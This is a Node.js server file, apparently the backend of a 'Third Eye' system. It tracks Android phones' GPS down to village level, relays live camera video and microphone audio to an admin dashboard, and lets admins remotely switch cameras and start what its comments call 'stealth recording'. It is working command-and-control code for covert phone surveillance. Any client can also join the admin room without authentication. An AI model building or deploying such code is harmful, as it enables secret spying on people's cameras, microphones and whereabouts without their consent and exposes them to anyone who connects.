require('dotenv').config();
const fs = require('fs');
if (fs.existsSync('/etc/secrets/.env')) {
  require('dotenv').config({ path: '/etc/secrets/.env' });
}
const express = require('express');
const cors = require('cors');
const morgan = require('morgan');
const path = require('path');
const mongoose = require('mongoose');

const http = require('http');
const { Server } = require('socket.io');

const deviceRoutes = require('./routes/deviceRoutes');
const videoRoutes = require('./routes/videoRoutes');
const adminRoutes = require('./routes/adminRoutes');
const Device = require('./models/Device');
const { resolveVillageOrPara } = require('./utils/geoCoder');
const { processDeviceLocationUpdate } = require('./utils/locationHelper');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*' },
  maxHttpBufferSize: 5e6, // 5MB buffer for video frames
});
app.set('io', io);

const PORT = process.env.PORT || 5000;
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://127.0.0.1:27017/thirdeye';

// Middleware
app.use(cors({ origin: '*' }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(morgan('dev'));

// Static files for uploads
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// Connected devices tracking
const connectedDevices = new Map();
const socketToDevice = new Map();

// Health check
app.get('/api/health', (req, res) => {
  res.json({
    status: 'online',
    timestamp: new Date(),
    mongoConnected: mongoose.connection.readyState === 1,
    onlineDevicesCount: connectedDevices.size,
  });
});

// API Routes
app.use('/api/device', deviceRoutes);
app.use('/api/devices', deviceRoutes);
app.use('/api/videos', videoRoutes);
app.use('/api/admin', adminRoutes);

// Socket.io Real-Time Live Streaming & Command Events
io.on('connection', (socket) => {
  // Helper to ensure socket is properly registered in rooms and device maps
  const trackDeviceSocket = (deviceId, deviceName, batteryLevel, isRecording, latitude, longitude, locationName, villageOrPara, districtAndCountry) => {
    if (!deviceId) return;
    socket.join(`device_${deviceId}`);
    socket.join('devices');
    socketToDevice.set(socket.id, deviceId);

    const existing = connectedDevices.get(deviceId) || {};
    const now = new Date();
    connectedDevices.set(deviceId, {
      ...existing,
      socketId: socket.id,
      deviceId,
      deviceName: deviceName || existing.deviceName || 'Android Device',
      batteryLevel: batteryLevel !== undefined ? batteryLevel : (existing.batteryLevel || 100),
      isRecording: isRecording !== undefined ? Boolean(isRecording) : (existing.isRecording || false),
      lastSeen: now,
      latitude: latitude ? Number(latitude) : (existing.latitude || null),
      longitude: longitude ? Number(longitude) : (existing.longitude || null),
      locationName: locationName || existing.locationName || '',
      villageOrPara: villageOrPara || existing.villageOrPara || '',
      districtAndCountry: districtAndCountry || existing.districtAndCountry || '',
      locationUpdatedAt: latitude ? now : (existing.locationUpdatedAt || undefined),
    });
  };

  // Device registration from Android phone
  socket.on('register-device', async (data) => {
    if (!data || !data.deviceId) return;
    let { deviceId, deviceName, batteryLevel, latitude, longitude, locationName, villageOrPara, districtAndCountry } = data;
    const now = new Date();

    // High precision Village / Para resolution if coordinates exist
    if (latitude && longitude) {
      const isGeneric = !villageOrPara ||
        ['dhaka', 'chittagong', 'chattogram', 'sylhet', 'rajshahi', 'khulna', 'barishal', 'rangpur'].includes(villageOrPara.toLowerCase().trim());
      if (isGeneric) {
        try {
          const resolved = await resolveVillageOrPara(latitude, longitude);
          if (resolved && resolved.villageOrPara) {
            villageOrPara = resolved.villageOrPara;
            if (resolved.districtAndCountry) districtAndCountry = resolved.districtAndCountry;
            if (resolved.locationName) locationName = resolved.locationName;
          }
        } catch (e) {
          // ignore
        }
      }
    }

    trackDeviceSocket(deviceId, deviceName, batteryLevel, false, latitude, longitude, locationName, villageOrPara, districtAndCountry);
    console.log(`📱 Device registered on Socket: ${deviceId} (${deviceName || 'Android'}) [📍 ${villageOrPara || locationName || 'Locating...'}]`);

    // Keep MongoDB lastSeen & location up to date
    try {
      await Device.findOneAndUpdate(
        { deviceId },
        {
          lastSeen: now,
          ...(batteryLevel !== undefined ? { batteryLevel } : {}),
          ...(data.videoQuality ? { videoQuality: data.videoQuality } : {}),
          ...(data.cameraLens ? { cameraLens: data.cameraLens } : {}),
          ...(latitude ? { latitude: Number(latitude), locationUpdatedAt: now } : {}),
          ...(longitude ? { longitude: Number(longitude) } : {}),
          ...(locationName ? { locationName } : {}),
          ...(villageOrPara ? { villageOrPara } : {}),
          ...(districtAndCountry ? { districtAndCountry } : {}),
        },
        { upsert: true }
      );
    } catch (e) {
      console.error('Error updating device lastSeen on register:', e.message);
    }

    // Notify admins that this device is live with real-time location
    io.to('admins').emit('device-status-change', {
      deviceId,
      isOnline: true,
      lastSeen: now,
      batteryLevel: batteryLevel !== undefined ? batteryLevel : 100,
      latitude: latitude ? Number(latitude) : undefined,
      longitude: longitude ? Number(longitude) : undefined,
      locationName: locationName || undefined,
      villageOrPara: villageOrPara || undefined,
      districtAndCountry: districtAndCountry || undefined,
      locationUpdatedAt: latitude ? now : undefined,
    });
  });

  // Device periodic heartbeat (every 15-20s from phone) with real-time GPS
  socket.on('device-heartbeat', async (data) => {
    if (!data || !data.deviceId) return;
    let { deviceId, deviceName, batteryLevel, isRecording, latitude, longitude, locationName, villageOrPara, districtAndCountry } = data;
    const now = new Date();

    if (latitude && longitude) {
      const isGeneric = !villageOrPara ||
        ['dhaka', 'chittagong', 'chattogram', 'sylhet', 'rajshahi', 'khulna', 'barishal', 'rangpur'].includes(villageOrPara.toLowerCase().trim());
      if (isGeneric) {
        try {
          const resolved = await resolveVillageOrPara(latitude, longitude);
          if (resolved && resolved.villageOrPara) {
            villageOrPara = resolved.villageOrPara;
            if (resolved.districtAndCountry) districtAndCountry = resolved.districtAndCountry;
            if (resolved.locationName) locationName = resolved.locationName;
          }
        } catch (e) {
          // ignore
        }
      }
    }

    let updatedLocationEntry = null;
    let isNewLocation = false;

    try {
      let device = await Device.findOne({ deviceId });
      if (!device) {
        device = new Device({ deviceId, deviceName: deviceName || 'Android' });
      }

      device.lastSeen = now;
      if (batteryLevel !== undefined) device.batteryLevel = batteryLevel;
      if (isRecording !== undefined) device.isRecording = Boolean(isRecording);
      if (data.videoQuality) device.videoQuality = data.videoQuality;
      if (data.cameraLens) device.cameraLens = data.cameraLens;

      if (latitude && longitude) {
        const locResult = processDeviceLocationUpdate(device, {
          latitude,
          longitude,
          locationName,
          villageOrPara,
          districtAndCountry,
          accuracy: data.accuracy,
          source: data.source,
        }, now);
        updatedLocationEntry = locResult.updatedEntry;
        isNewLocation = locResult.isNew;
      }

      await device.save();

      io.to('admins').emit('device-heartbeat', {
        deviceId,
        lastSeen: now,
        batteryLevel,
        isRecording: Boolean(isRecording),
        videoQuality: data.videoQuality,
        cameraLens: data.cameraLens,
        latitude: latitude ? Number(latitude) : undefined,
        longitude: longitude ? Number(longitude) : undefined,
        locationName: locationName || undefined,
        villageOrPara: villageOrPara || undefined,
        districtAndCountry: districtAndCountry || undefined,
        locationUpdatedAt: latitude ? now : undefined,
        accuracy: data.accuracy || 10,
        source: data.source || 'GPS',
        isOnline: true,
        locationHistory: device.locationHistory,
        updatedLocationEntry,
        isNewLocation,
      });
    } catch (e) {
      console.error('Error updating device heartbeat:', e.message);
    }
  });

  // Admin requests real-time GPS location refresh from phone
  socket.on('request-device-location', ({ deviceId }) => {
    console.log(`🛰️ Admin requested real-time GPS refresh for device: ${deviceId}`);
    io.to(`device_${deviceId}`).emit('request-device-location', { deviceId });
    io.to('devices').emit('request-device-location', { deviceId });
  });

  // Admin registration from React dashboard
  socket.on('register-admin', () => {
    socket.join('admins');
    // Send list of currently online socket devices
    socket.emit('online-devices-list', Array.from(connectedDevices.keys()));
  });

  // Admin requests to watch live stream for a device
  socket.on('request-live-stream', async ({ deviceId, camera = 'BACK' }) => {
    console.log(`🎥 Live stream requested for ${deviceId} (Lens: ${camera})`);
    socket.join(`watch_${deviceId}`);

    let dev = connectedDevices.get(deviceId);
    const room = io.sockets.adapter.rooms.get(`device_${deviceId}`);
    const isRoomActive = room && room.size > 0;

    // Check if device is active in DB (seen in last 5 minutes)
    let isDbActive = false;
    try {
      const dbDev = await Device.findOne({ deviceId });
      if (dbDev && dbDev.lastSeen) {
        const diffMs = Date.now() - new Date(dbDev.lastSeen).getTime();
        isDbActive = diffMs < 300000; // 5 minutes
      }
    } catch (e) {
      // ignore
    }

    if (!dev && !isRoomActive && !isDbActive) {
      console.warn(`Device ${deviceId} is offline (no socket, room empty, DB inactive).`);
      socket.emit('stream-error', { deviceId, error: 'Device is offline or unreachable' });
      return;
    }

    if (dev) {
      dev.isStreaming = true;
    }

    // Broadcast to target device room
    io.to(`device_${deviceId}`).emit('start-live-stream', {
      adminSocketId: socket.id,
      deviceId,
      camera,
    });
  });

  // Phone sends a compressed video frame
  socket.on('stream-frame', (data) => {
    if (data && data.deviceId) {
      trackDeviceSocket(data.deviceId);
      // Forward frame to all admins watching this device
      socket.to(`watch_${data.deviceId}`).emit('live-frame', {
        deviceId: data.deviceId,
        frame: data.frame,
        timestamp: Date.now(),
      });
    }
  });

  // Phone sends real-time microphone audio chunk (PCM)
  socket.on('stream-audio', (data) => {
    if (data && data.deviceId) {
      trackDeviceSocket(data.deviceId);
      // Forward audio to all admins watching this device
      socket.to(`watch_${data.deviceId}`).emit('live-audio', {
        deviceId: data.deviceId,
        audio: data.audio,
        sampleRate: data.sampleRate || 16000,
        channels: data.channels || 1,
        timestamp: Date.now(),
      });
    }
  });

  // Admin stops watching a device
  socket.on('stop-watching-device', ({ deviceId }) => {
    socket.leave(`watch_${deviceId}`);
    const room = io.sockets.adapter.rooms.get(`watch_${deviceId}`);
    if (!room || room.size === 0) {
      console.log(`🛑 All admins left, stopping live stream on: ${deviceId}`);
      io.to(`device_${deviceId}`).emit('stop-live-stream', { deviceId });
      const dev = connectedDevices.get(deviceId);
      if (dev) dev.isStreaming = false;
    }
  });

  // Switch camera remotely (FRONT <-> BACK)
  socket.on('switch-camera', ({ deviceId, camera }) => {
    console.log(`🔄 Remote switch camera for ${deviceId} -> ${camera}`);
    io.to(`device_${deviceId}`).emit('switch-camera', { deviceId, camera });
  });

  // Admin remotely triggers stealth recording on phone
  socket.on('start-remote-recording', async ({ deviceId, camera }) => {
    const lens = camera === 'FRONT' ? 'FRONT' : 'BACK';
    console.log(`⏺️ Remote recording requested for: ${deviceId} with lens: ${lens}`);
    try {
      await Device.findOneAndUpdate({ deviceId }, { isRecording: true });
    } catch (e) {}
    io.to(`device_${deviceId}`).emit('start-remote-recording', { deviceId, camera: lens });
    io.to('admins').emit('device-recording-status', { deviceId, isRecording: true, camera: lens });
  });

  // Admin remotely stops stealth recording on phone
  socket.on('stop-remote-recording', async ({ deviceId }) => {
    console.log(`⏹️ Remote recording stop requested for: ${deviceId}`);
    try {
      await Device.findOneAndUpdate({ deviceId }, { isRecording: false });
    } catch (e) {}
    io.to(`device_${deviceId}`).emit('stop-remote-recording', { deviceId });
    io.to('admins').emit('device-recording-status', { deviceId, isRecording: false });
  });

  // Device notifies recording started or stopped (via hardware buttons or app UI)
  socket.on('device-recording-status', async ({ deviceId, isRecording }) => {
    console.log(`📡 Device ${deviceId} recording state changed: ${isRecording}`);
    try {
      await Device.findOneAndUpdate({ deviceId }, { isRecording: Boolean(isRecording) });
    } catch (e) {}
    io.to('admins').emit('device-recording-status', { deviceId, isRecording: Boolean(isRecording) });
  });

  // Disconnect handler
  socket.on('disconnect', async () => {
    const deviceId = socketToDevice.get(socket.id);
    if (deviceId) {
      const currentDev = connectedDevices.get(deviceId);
      // Only remove if this socket is the active one registered for this device
      if (currentDev && currentDev.socketId === socket.id) {
        connectedDevices.delete(deviceId);
      }
      socketToDevice.delete(socket.id);
      const now = new Date();
      console.log(`📱 Device socket disconnected: ${deviceId}`);

      try {
        await Device.findOneAndUpdate({ deviceId }, { lastSeen: now });
      } catch (e) {}

      io.to('admins').emit('device-status-change', {
        deviceId,
        isOnline: false,
        lastSeen: now,
      });
      io.to(`watch_${deviceId}`).emit('stream-ended', { deviceId, reason: 'Device disconnected' });
    }
  });
});

// Connect to MongoDB & Start Server
mongoose
  .connect(MONGODB_URI)
  .then(() => {
    console.log('✅ Connected to MongoDB successfully.');
  })
  .catch((err) => {
    console.error('⚠️ MongoDB connection error:', err.message);
    console.log('💡 Tip: Ensure MongoDB service is running');
  });

server.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Third Eye Server running on http://0.0.0.0:${PORT}`);
  console.log(`📡 WebSocket & Video Streaming Ready.`);
});
